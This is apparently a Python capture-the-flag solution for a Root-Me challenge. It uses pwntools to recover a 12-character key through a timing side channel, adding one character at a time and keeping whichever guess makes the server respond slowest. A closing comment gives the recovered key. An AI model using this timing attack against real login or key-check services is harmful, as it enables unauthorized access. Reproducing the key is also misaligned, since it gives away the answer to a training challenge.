import pwn,time
import re
import base64
from itertools import product

host='challenge01.root-me.org'
port=51015
char='1234567890-'

s=pwn.remote(host,port)
pr=s.recv()
print pr
legal=0.3 # time to test non valid caracter
tmp=0
login=""
while(len(login)!=12):
	for ele in char:
		key=login+ele
		debut=time.time()
		s.sendline(key)
		pr=s.recv()
		fin =time.time()
		delta_time=fin-debut
		if delta_time<legal+tmp:

			print "WAITING......"+key+' >> '+str(delta_time)
		else:
			tmp=delta_time   # time for a valid caracters
			login=key
			print "GOOD....."+login+' >> '+str(delta_time)
			print pr
			break;
# GOOD.....30467-132630>>6.06956100464
# Good key, use it to validate the challenge 30467-132630